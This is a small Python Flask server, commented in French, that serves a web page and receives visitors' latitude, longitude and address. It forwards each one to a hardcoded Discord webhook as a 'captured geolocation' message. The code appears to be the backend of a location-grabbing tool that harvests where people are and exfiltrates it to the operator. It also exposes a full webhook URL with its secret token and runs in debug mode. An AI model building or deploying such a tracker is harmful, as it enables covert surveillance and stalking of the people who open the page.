from flask import Flask, send_from_directory, request
import requests

app = Flask(__name__)

# Remplace ceci par ton vrai webhook
WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr"

@app.route('/')
def index():
    # Sert le index.html depuis la racine
    return send_from_directory('.', 'index.html')

@app.route('/style.css')
def style():
    return send_from_directory('.', 'style.css')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    address = data.get('address')

    if latitude and longitude:
        message = {
            "content": f"📍 Nouvelle géolocalisation capturée :\n🌐 Latitude : {latitude}\n🌐 Longitude : {longitude}\n📫 Adresse : {address}"
        }
        try:
            requests.post(WEBHOOK_URL, json=message)
            return {"status": "success"}, 200
        except Exception as e:
            return {"status": "error", "message": str(e)}, 500
    else:
        return {"status": "error", "message": "Coordonnées manquantes"}, 400

if __name__ == '__main__':
    app.run(debug=True)
